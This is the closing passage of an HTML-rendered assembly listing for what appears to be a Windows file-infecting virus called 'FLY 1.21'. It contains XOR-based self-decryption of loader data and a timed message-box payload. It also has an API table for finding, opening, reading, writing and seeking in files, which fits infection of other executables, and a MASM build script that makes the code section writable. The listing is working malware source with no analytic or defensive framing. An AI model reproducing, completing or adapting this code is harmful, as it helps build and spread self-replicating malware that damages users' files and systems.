</span><span class="sc5">ARG_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_3</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSHAD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_1</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_2</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_3</span><span class="sc0">
    </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">
    </span><span class="sc6">POPAD</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; [ESP  +  4] - src</span><span class="sc0">
</span><span class="sc1">; [ESP  +  8] - size</span><span class="sc0">
</span><span class="sc1">; [ESP  +  C] - xor byte</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ReservedRegs: ALL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">memxor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ARG_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_3</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">PUSHA_STRUCT</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSHAD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_1</span><span class="sc0">                                           </span><span class="sc1">; ESI -&gt; data ptr</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_2</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_3</span><span class="sc0">                                           </span><span class="sc1">; EAX -&gt; xor byte</span><span class="sc0">
  </span><span class="sc5">memxor_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">memxor_loop</span><span class="sc0">             
    </span><span class="sc6">POPAD</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">  
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; this is the payload</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ReservedRegs: ALL</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc5">DriveUserNutsHiHi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; PC already MIN_PAYLOAD_TICK seconds up ?</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetTickCount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MIN_PAYLOAD_TICK</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">DriveUserNutsHiHi_exit</span><span class="sc0">
    </span><span class="sc1">; build "USER32\0" on stack</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">                                             </span><span class="sc1">; User32 str on stack</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"RESU"</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"23"</span><span class="sc0">
    </span><span class="sc1">; get MessageBoxA addr</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_LoadLibrary</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; EAX -&gt; U32 base</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">DriveUserNutsHiHi_exit</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MBStrSize</span><span class="sc4">]</span><span class="sc0">                               </span><span class="sc1">; EDI -&gt; API info (str size/str)</span><span class="sc0">
    </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetProcAddr</span><span class="sc0">                                          </span><span class="sc1">; EAX -&gt; MessageBoxA addr</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">DriveUserNutsHiHi_exit</span><span class="sc0">
    </span><span class="sc1">; show msg</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MB_ICONWARNING</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MB_TOPMOST</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szMBCaption</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szMBText</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">DriveUserNutsHiHi_exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: NO</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; EBX - EntryPoint RVA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returns: xor byte to dexor loader data parition in EAX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GetXorByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">GetXorByte_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">GetXorByte_loop</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     

</span><span class="sc1">; ------ VARIABLES ----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Loader_Variables</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">dwEPRva</span><span class="sc0">                                 </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">; 0 in first generation</span><span class="sc0">

</span><span class="sc5">Variable_Crypt_Start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">dwImageBase</span><span class="sc0">                             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">; 0 in first generation</span><span class="sc0">
</span><span class="sc5">dwK32Base</span><span class="sc0">                               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">bEntryData</span><span class="sc0">                              </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MBStrSize</span><span class="sc0">                               </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">szMB</span><span class="sc0">                                    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMBText</span><span class="sc0">                                </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"You stink."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMBCaption</span><span class="sc0">                             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"FLY 1.21"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">API_table</span><span class="sc4">:</span><span class="sc0">
                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectory</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szGetCurrentDirectory</span><span class="sc0">                   </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectory</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szSetCurrentDirectory</span><span class="sc0">                   </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_FindFirstFile</span><span class="sc0">                          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szFindFirstFile</span><span class="sc0">                         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_FindNextFile</span><span class="sc0">                           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szFindNextFile</span><span class="sc0">                          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">                              </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szFindClose</span><span class="sc0">                             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_CreateFile</span><span class="sc0">                             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szCreateFile</span><span class="sc0">                            </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">                            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szCloseHandle</span><span class="sc0">                           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">                            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szGetFileSize</span><span class="sc0">                           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_GlobalAlloc</span><span class="sc0">                            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szGlobalAlloc</span><span class="sc0">                           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_GlobalFree</span><span class="sc0">                             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szGlobalFree</span><span class="sc0">                            </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"GlobalFree"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_ReadFile</span><span class="sc0">                               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szReadFile</span><span class="sc0">                              </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"ReadFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">                              </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szWriteFile</span><span class="sc0">                             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_SetFilePointer</span><span class="sc0">                         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szSetFilePointer</span><span class="sc0">                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_LoadLibrary</span><span class="sc0">                            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szLoadLibrary</span><span class="sc0">                           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_GetTickCount</span><span class="sc0">                           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szGetTickCount</span><span class="sc0">                          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"GetTickCount"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dwcAPITableEnd</span><span class="sc0">                          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_table_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Loader_Variables_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Variable_Crypt_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">FLY_END</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc0">
</span><span class="sc1">; ------ END ----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc4">:</span><span class="sc5">MAKE</span><span class="sc0">
</span><span class="sc5">CLS</span><span class="sc0">
\</span><span class="sc5">MASM32</span><span class="sc0">\</span><span class="sc5">BIN</span><span class="sc0">\</span><span class="sc5">ML</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">nologo</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc10">c</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">coff</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">Gz</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">Cp</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">Zp1</span><span class="sc0"> </span><span class="sc5">FLY.BAT</span><span class="sc0">
\</span><span class="sc5">MASM32</span><span class="sc0">\</span><span class="sc5">BIN</span><span class="sc0">\</span><span class="sc5">LINK</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">nologo</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">SUBSYSTEM</span><span class="sc4">:</span><span class="sc5">WINDOWS</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc9">SECTION</span><span class="sc4">:</span><span class="sc10">.text</span><span class="sc4">,</span><span class="sc5">REW</span><span class="sc0"> </span><span class="sc5">FLY.obj</span><span class="sc0">
</span><span class="sc5">DEL</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc5">.OBJ</span><span class="sc0">
</span><span class="sc5">ECHO.</span><span class="sc0">
</span><span class="sc14">PAUSE</span><span class="sc0">
</span><span class="sc5">CLS</span><span class="sc0">
</span></div></body>
</html>
